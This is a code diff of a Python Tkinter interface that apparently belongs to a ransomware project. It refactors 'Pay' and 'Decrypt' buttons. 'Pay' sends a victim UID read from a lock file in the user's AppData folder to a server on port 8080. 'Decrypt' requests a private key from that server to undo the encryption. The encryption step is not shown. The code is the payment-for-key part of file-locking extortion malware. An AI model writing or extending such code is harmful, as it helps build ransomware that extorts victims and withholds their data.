@@ -102,18 +102,25 @@ def homePage():
 
     def btn():
         def __pay():
-            testPath,__rmfolderPath = "./data/lock.json",f"C:/Users/{os.getlogin()}/AppData/Local/bkms/lock.json"
-            s = MySocket.Client()
-            with open(testPath,"r") as file:
-                lock = json.load(file)
-            data = {
-                "getPrivate":False,
-                "UID": lock["UID"],
-                "padding": True
-            }
-            s.sendTCPMeg(data,8080)
+            def pay():
+                testPath,__rmfolderPath = "./data/lock.json",f"C:/Users/{os.getlogin()}/AppData/Local/bkms/lock.json"
+                s = MySocket.Client()
+                with open(testPath,"r") as file:
+                    lock = json.load(file)
+                data = {
+                    "getPrivate":False,
+                    "UID": lock["UID"],
+                    "padding": True
+                }
+                s.sendTCPMeg(data,8080)
+            payWindow = tk.Toplevel(root)
+            payWindow.title("Pay")
+            ttk.Button(payWindow,text="Pay",style="btn.TButton",command=pay).pack()
 
         def __decrypt():
+            decrypt_window = tk.Toplevel(root)
+            decrypt_window.title("Decryption Progress")
+
             def decrypt_in_thread():
                 testPath,__rmfolderPath = "./data/lock.json",f"C:/Users/{os.getlogin()}/AppData/Local/bkms/lock.json"
                 with open(testPath,"r") as file:
@@ -121,7 +128,7 @@ def homePage():
                 s = MySocket.Client()
                 privateKey = s.sendGetPrivateKey(lock["UID"],8080)
                 print(privateKey)
-                runDecryption(root,privateKey)
+                runDecryption(decrypt_window,privateKey)
             threading.Thread(target=decrypt_in_thread).start()
             
         btnFrame = tk.Frame(root,width=825,height=100,background="#910000")
